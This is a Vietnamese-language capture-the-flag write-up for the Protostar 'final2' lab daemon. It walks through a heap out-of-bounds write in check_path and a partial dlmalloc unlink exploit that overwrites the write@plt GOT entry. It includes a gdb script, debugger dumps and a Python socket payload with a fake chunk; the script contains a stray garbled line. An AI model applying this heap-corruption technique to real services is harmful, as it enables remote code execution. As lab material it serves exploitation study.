# Final two

Source code:

```c
#include "../common/common.c"
#include "../common/malloc.c"

#define NAME "final2"
#define UID 0
#define GID 0
#define PORT 2993

#define REQSZ 128

void check_path(char *buf)
{
  char *start;
  char *p;
  int l;

  /*
  * Work out old software bug
  */

  p = rindex(buf, '/');
  l = strlen(p);
  if(p) {
      start = strstr(buf, "ROOT");
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
          printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ?
          "yes" : "no", start - buf);
      }
  }
}

int get_requests(int fd)
{
  char *buf;
  char *destroylist[256];
  int dll;
  int i;

  dll = 0;
  while(1) {
      if(dll >= 255) break;

      buf = calloc(REQSZ, 1);
      if(read(fd, buf, REQSZ) != REQSZ) break;

      if(strncmp(buf, "FSRD", 4) != 0) break;

      check_path(buf + 4);     

      dll++;
  }

  for(i = 0; i < dll; i++) {
                write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  get_requests(fd);

}
```

## Chạy thử chương trình
```bash
root@protostar:/tmp# ps aux | grep final2
root      1589  0.0  0.0   1544   280 ?        Ss   Nov12   0:00 /opt/protostar/bin/final2
root      3253  0.0  0.0   3300   732 pts/2    S+   01:32   0:00 grep final2
root@protostar:/tmp# netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1026/portmap
tcp        0      0 0.0.0.0:2993            0.0.0.0:*               LISTEN      1589/final2
tcp        0      0 0.0.0.0:2994            0.0.0.0:*               LISTEN      2064/final1
tcp        0      0 0.0.0.0:2995            0.0.0.0:*               LISTEN      1585/final0
tcp        0      0 0.0.0.0:2996            0.0.0.0:*               LISTEN      1583/net3
tcp        0      0 0.0.0.0:2997            0.0.0.0:*               LISTEN      1581/net2
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1701/sshd
tcp        0      0 0.0.0.0:2998            0.0.0.0:*               LISTEN      1579/net1
tcp        0      0 0.0.0.0:2999            0.0.0.0:*               LISTEN      1577/net0
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1557/exim4
tcp        0      0 0.0.0.0:46399           0.0.0.0:*               LISTEN      1042/rpc.statd
tcp6       0      0 :::22                   :::*                    LISTEN      1701/sshd
tcp6       0      0 ::1:25                  :::*                    LISTEN      1557/exim4
udp        0      0 0.0.0.0:68              0.0.0.0:*                           1607/dhclient
udp        0      0 0.0.0.0:111             0.0.0.0:*                           1026/portmap
udp        0      0 0.0.0.0:40211           0.0.0.0:*                           1042/rpc.statd
udp        0      0 0.0.0.0:794             0.0.0.0:*                           1042/rpc.statd
root@protostar:/tmp# nc  127.0.0.1 2993

Process OK
```

## Review code
- Hàm `main` gọi đến `get_requests(fd);` với tham số truyền vào là file descriptor fd.
- Trong hàm `get_requests()` để ý đến 2 vòng lặp:
```c
while(1) {
      if(dll >= 255) break;

      buf = calloc(REQSZ, 1);
      if(read(fd, buf, REQSZ) != REQSZ) break;

      if(strncmp(buf, "FSRD", 4) != 0) break;

      check_path(buf + 4);     

      dll++;
  }
```
`if(read(fd, buf, REQSZ) != REQSZ) break;` đọc từ file liên kết với file descriptor `fd` vào buffer rồi kiểm tra số byte đọc vào có bằng với `REQSZ` hay không. Nếu không thì break.
`if(strncmp(buf, "FSRD", 4) != 0) break;` kiểm tra xem buf có bắt đầu với "FRSD" hay không. Nếu không thỏa mãn thì break.
Cuối cùng nó gọi đến hàm `check_path()` và tăng biến đếm dll

```c
for(i = 0; i < dll; i++) {
                write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
```
Lặp qua các dữ liệu ta đã nhập vào(bắt đầu từ 0), in ra "Process OK" và gọi đến hàm `free()`. Đoạn code này không rõ ràng lắm và có thể không đầy đủ nhưng destroylist[i] chính là các buf mà ta đã nhập vào lúc trước.
- Hàm `check_path(char *buf)` nhận vào tham số là buf:
```c
p = rindex(buf, '/');
l = strlen(p);
```
`p = rindex(buf, '/');` trả về con trỏ trỏ đến kí tự '/' cuối cùng
`l = strlen(p);` trả về độ dài của p
> Ví dụ:
> AAAA/BBBB/CCCC
> ` ` ` ` ` ` ` ` ^
> Trong trường hợp này, p = "/CCCC" và l = 5

```c
if(p) {
  start = strstr(buf, "ROOT");
    if(start) {
      while(*start != '/') start--;
      memmove(start, p, l);
      printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ? "yes" : "no", start - buf);
    }
  }
```

Khối điều kiện này kiểm tra p có tồn tại không, sau đó tìm chuỗi `ROOT` trong buf và cho con trỏ start bắt đầu từ kí tự "R" của `ROOT`. 
Nếu start tồn tại thì tìm kí tự "/" đứng trước `ROOT` bằng cách giảm giá trị con trỏ `start` sau đó move con trỏ p đến đó.
Phần có lỗi ở đây là `while(*start != '/') start--;`. Nếu như đằng trước ROOT không có kí tự "/" thì start sẽ liên tục bị dịch về phía trước và để tìm "/" và do vậy sẽ leak được bộ nhớ heap của chương trình.











## Exploitation
- Mục tiêu của chúng ta trong bài này là tận dụng cơ chế unlink của dlmalloc để ghi để thay đổi giá trị bên trong GOT của hàm `write@plt`

## Thêm vài skill debug
- Viết file `.gdbinit` cho tiện debug trong đó

Đặt breakpoint ở `memmove@plt` 
```bash
0x0804bd40 <check_path+112>:    call   0x8048f8c <memmove@plt>
```
Đặt beakpoint ở `free`
```bash
0x0804be13 <get_requests+204>:  call   0x804a9c2 <free>
```
Đặt breakpoint ở return của get_request():
```bash
0x0804be25 <get_requests+222>:  ret
```
Và đặt breakpoint ở trước `write@plt`:
```bash
0x0804be01 <get_requests+186>:  call   0x8048dfc <write@plt>
```


```bash
root@protostar:/tmp# vim .gdbinit
root@protostar:/tmp# cat .gdbinit
set follow-fork-mode child
set disassembly-flavor intel
set pagination off

b *0x0804bd40
commands
silent
printf "Dst: %s\n", start
printf "source: %s\n", p
printf "length: %d\n", l
continue
end


commands
silent
x/64wx 0x0804e000
end

continue
```

- Mục tiêu của chúng ta ở bài này là ghi vào `write@plt` do đó cần kiểm tra:
```
0x0804be01 <get_requests+186>:  call   0x8048dfc <write@plt>
```

```bash
(gdb) disass 0x8048dfc
Dump of assembler code for function write@plt:
0x08048dfc <write@plt+0>:       jmp    *0x804d41c
0x08048e02 <write@plt+6>:       push   $0x68
0x08048e07 <write@plt+11>:      jmp    0x8048d1c
End of assembler dump.
(gdb) x/wx 0x804d41c
0x804d41c <_GLOBAL_OFFSET_TABLE_+64>:   0xb7f53c70
```

- Có 1 trick khá hay ở điểm này. Đấy là chương trình sẽ chờ đợi chúng ta liên tục gửi cho đến khi nào không gửi nữa thì nó mới chạy đến breakpoint ở `write@plt`. Do vậy trong chương trình python chúng ta có thể dùng raw_input, hoặc xóa luôn vòng lặp while bên dưới, hoặc đơn giản là tạo ra 1 cái bug trong chương trình(vì python là ngôn ngữ thông dịch)

```py
import socket
import struct
import telnetlib
REQSZ = 128
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 2993))

def pad(m):
    padding = "\x00"*(REQSZ - len(m))
    _m = "FSRD" + m + padding
    return _m[:REQSZ]

s.send(pad('/ROOT/'+'/'*128))
fake_chunk = struct.pack("I", 0xfffffffc) + struct.pack("I", 0xfffffffc)
fake_chunk += struct.pack("I", 0x804d41c-0xc) + struct.pack("I", 0x804e020)
s.send(pad("ROOT/"+fake_chunk))

*************************aabcdef*************************
while True:
    msg = raw_input("> ")
    if msg:
        print 'msg: %r' % pad(msg)
        s.send(pad(msg))
    else:
        break

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Do đó mà ta có thể debug được. Sau khi lược bớt các dòng thừa thãi ta có:
```gdb
root@protostar:/tmp# gdb -p 1589
Breakpoint 1 at 0x804bd40: file final2/final2.c, line 27.
Breakpoint 2 at 0x804be25: file final2/final2.c, line 58.
Breakpoint 3 at 0x804be13: file final2/final2.c, line 55.
Breakpoint 4 at 0x804be01: file final2/final2.c, line 54.
[New process 4939]
[Switching to process 4939]
The current source language is "auto; currently c".
buf: /ROOT///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
Dst: /ROOT///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
source: /
length: 1
buf: ROOT/�������� �
Dst: /
source: /�������� �
length: 17

Breakpoint 4, 0x0804be01 in get_requests (fd=4) at final2/final2.c:54
54      final2/final2.c: No such file or directory.
        in final2/final2.c
(gdb) x/64wx 0x0804e000
0x804e000:      0x00000000      0x00000089      0x44525346      0x4f4f522f
0x804e010:      0x2f2f2f54      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e020:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e030:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e040:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e050:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e060:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e070:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e080:      0x2f2f2f2f      0x2f2f2f2f      0xfffffffc      0xfffffffc
0x804e090:      0x0804d410      0x0804e020      0xfffffc2f      0xfffffcff
0x804e0a0:      0x04d410ff      0x04e02008      0x00000008      0x00000000
0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
```





## Reference
- https://github.com/ennorehling/dlmalloc/blob/master/malloc.c
- 